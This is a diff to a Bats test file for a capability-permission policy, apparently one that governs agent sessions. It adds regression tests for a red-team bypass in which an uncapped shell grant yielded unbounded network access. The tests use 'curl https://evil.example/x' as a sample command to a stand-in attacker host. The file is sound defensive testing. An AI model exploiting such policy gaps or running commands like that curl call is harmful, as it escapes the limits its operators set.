@@ -257,9 +257,61 @@ const cleanup = (d) => { try { fs.rmSync(d, { recursive: true, force: true }); }
   [[ "$output" == *"control=execute"* ]]
 }
 
+@test "PHASE 04 -- shell that EXECUTES with no argv0_allow is capped, not unbounded" {
+  # A Phase 04 attacker raised one kind's shell to L3 with no argv0_allow and got unbounded
+  # network and an unbounded interpreter out of a kind whose write and network were both L1 --
+  # policy-lint printed "is law" over the file. reproducedBy returns an empty set for an absent
+  # allowlist, so effectiveShell minned over NOTHING and kept L3, and the L3 branch of
+  # authorizeAction never consults an allowlist either.
+  run _node "$PRE
+    const out = [];
+    // no argv0_allow at all, shell raised to a level that executes
+    out.push('L3-noallow=' + JSON.stringify(P.authorizeAction(
+      {kind:'session:interactive', capability:'shell', resource:'curl https://evil.example/x'},
+      {policy: base({shell:{level:'L3'}}), events: []}).effective));
+    out.push('L2-noallow=' + JSON.stringify(P.authorizeAction(
+      {kind:'session:interactive', capability:'shell', resource:'curl https://evil.example/x'},
+      {policy: base({shell:{level:'L2'}}), events: []}).effective));
+    // CONTROL: a level that never executes is untouched by this rule
+    out.push('L1-noallow=' + JSON.stringify(P.authorizeAction(
+      {kind:'session:interactive', capability:'shell', resource:'jq .'},
+      {policy: base({shell:{level:'L1'}}), events: []}).effective));
+    console.log(out.join(' '));"
+  [ "$status" -eq 0 ] || { echo "$output"; false; }
+  [[ "$output" == *'L3-noallow="L1"'* ]] || { echo "$output"; false; }
+  [[ "$output" == *'L2-noallow="L1"'* ]] || { echo "$output"; false; }
+  # The control: L1 is a propose level, nothing executes, so the rule must not fire there.
+  [[ "$output" == *'L1-noallow="L1"'* ]] || { echo "$output"; false; }
+}
+
+@test "PHASE 04 -- reproduces:[shell] fails CLOSED, the one token ADR-0507 forbids" {
+  # reproducedBy excluded "shell" from BOTH arms, so the single token the ADR bans was the one
+  # that made the derivation add nothing: reproduces:["shell"] returned an empty set and left
+  # the grant uncapped. policy-lint rejects that token -- but this function is also called by
+  # hooks that never ran the lint, which is the reasoning already written for an unclassified
+  # program, one branch further up.
+  run _node "$PRE
+    const r = (list) => [...P.reproducedBy(['p'], {p:{class:'x', reproduces:list}})].sort().join(',');
+    const out = [];
+    out.push('shell=[' + r(['shell']) + ']');
+    out.push('star=[' + r(['*']) + ']');
+    out.push('unknown=[' + r(['nonsense']) + ']');
+    out.push('narrow=[' + r([]) + ']');
+    out.push('network=[' + r(['network']) + ']');
+    console.log(out.join(' '));"
+  [ "$status" -eq 0 ] || { echo "$output"; false; }
+  # malformed widens: identical to the unknown-token and the "*" cases
+  [[ "$output" == *"shell=[deploy,message,network,publish,read,spend,write]"* ]] || { echo "$output"; false; }
+  [[ "$output" == *"unknown=[deploy,message,network,publish,read,spend,write]"* ]]
+  # CONTROLS: a genuinely narrow entry and a single-capability entry must stay narrow, or the
+  # fix is just "widen everything", which caps every shell grant and proves nothing.
+  [[ "$output" == *"narrow=[]"* ]] || { echo "$output"; false; }
+  [[ "$output" == *"network=[network]"* ]] || { echo "$output"; false; }
+}
+
 @test "this file registered every test it declares" {
-  [ "${#BATS_TEST_NAMES[@]}" -eq 16 ] || {
-    echo "registered ${#BATS_TEST_NAMES[@]} tests, expected 16 -- a @test was silently dropped"
+  [ "${#BATS_TEST_NAMES[@]}" -eq 18 ] || {
+    echo "registered ${#BATS_TEST_NAMES[@]} tests, expected 18 -- a @test was silently dropped"
     false
   }
 }
